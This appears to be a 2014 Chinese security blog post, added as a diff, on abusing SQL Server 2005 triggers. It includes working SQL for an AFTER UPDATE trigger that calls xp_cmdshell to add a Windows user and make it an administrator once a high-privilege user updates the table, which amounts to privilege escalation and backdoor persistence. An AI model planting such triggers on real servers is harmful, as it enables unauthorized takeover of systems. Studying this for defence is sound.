@@ -1,0 +1,20 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">SqlServer 2005 Trigger</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">darksn0w</a> <span class="bull">·</span> <time title="2014/11/02 13:23" ui-time="" datetime="2014/11/02 13:23" class="published ng-binding ng-isolate-scope">2014/11/02 13:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x01 什么是触发器：</h2><hr><p>触发器对表进行插入、更新、删除的时候会自动执行的特殊存储过程。触发器一般用在check约束更加复杂的约束上面。触发器和普通的存储过程的区别是：触发器是当对某一个表进行操作。诸如：update、insert、delete这些操作的时候，系统会自动调用执行该表上对应的触发器。SQL Server 2005中触发器可以分为两类：DML触发器和DDL触发器，其中DDL触发器它们会影响多种数据定义语言语句而激发，这些语句有create、alter、drop语句。</p><h2>0x02 问题描述：</h2><hr><p>a)通过Sqlserver的触发器，可以利用执行者的权限执行自定义的命令。</p><p>b)渗透过程中可能利用的触发器场景：在设置好触发器以后，等待、诱使高权限用户去触发这个触发器，来实现入侵、提权、留后门等目的。</p><p>c)Sqlserver的触发器可以分为两类：DML触发器(After insert，After delete，After update和instead of)和DDL触发器（for）。</p><p>实验环境： Win2003x86 &amp;&amp; SqlServer 2005，默认安装Sqlserver，安装一个开源应用siteserver，并建立test用户，不给予服务器角色，数据库角色仅给予dbo和public权限。并将test库与test用户相互映射。SqlServer的xp_cmdshell已经被恢复。</p><p>实验过程： a)使用test用户建立触发器语句：</p><pre><code>#!bash
+SET ANSI_NULLS ON
+GO
+SET QUOTED_IDENTIFIER ON
+GO                             --这些是 SQL-92 设置语句，使 mssql 遵从 SQL-92 规则。
+CREATE TRIGGER test
+   ON bairong_Administrator
+   AFTER UPDATE           /*建立一个作用于表bairong_Administrator的、
+                            类型为After update的、名为test的触发器*/
+AS 
+BEGIN
+    --EXECUTE SP_ADDEXTENDEDPROC 'MASTER.DBO.XP_CMDSHELL','XPLOG70.DLL'
+           EXECUTE MASTER.DBO.XP_CMDSHELL 'net user STD 123456 /add'
+    EXECUTE MASTER.DBO.XP_CMDSHELL 'net localgroup administrators STD /add'
+           /*默认格式begin为开头加上触发后执行的语句,这里是利用储存过程添加系统账号。*/
+END
+GO
+</code></pre><p><img alt="enter image description here" img-src="d4433281cfea7b67fb87ed1f4d509403441cee24.jpg"></p><p>b)执行UPDATE操作，是触发器执行：</p><p>1)使用UPDATE语句来触发触发器：</p><pre><code>#!bash
+UPDATE bairong_Administrator SET <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="febb939f9792c3d9adaababe908d98919d8b8dd09d9193">[email&#160;protected]</a>' WHERE UserName='admin';
+</code></pre><p>使用test用户执行：</p><p><img alt="enter image description here" img-src="d1d34d9a81caad3f1b0e3c71589ce9ba413a58a6.jpg"></p><p><img alt="enter image description here" img-src="e7141c597a79abc6dfd4df475392c63135679310.jpg"></p><p><img alt="enter image description here" img-src="29b33b0fbd58bcfc74e6808abd16685db9723bce.jpg"></p><p>2)使用sa用户执行：</p><p><img alt="enter image description here" img-src="fe11e7d9005f2085cfe77f5cb5d5be0a1eaf29a9.jpg"></p><p><img alt="enter image description here" img-src="b548d0c3e8142ebb6bb405b2bb28aeaad7802a4c.jpg"></p><p><img alt="enter image description here" img-src="fed287a71bb7d45b752594f90975b7cfc87cab14.jpg"></p><p>那么这就产生一个问题了，如何利用被动触发留后门或渗透攻击。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"></div></div></div></main>
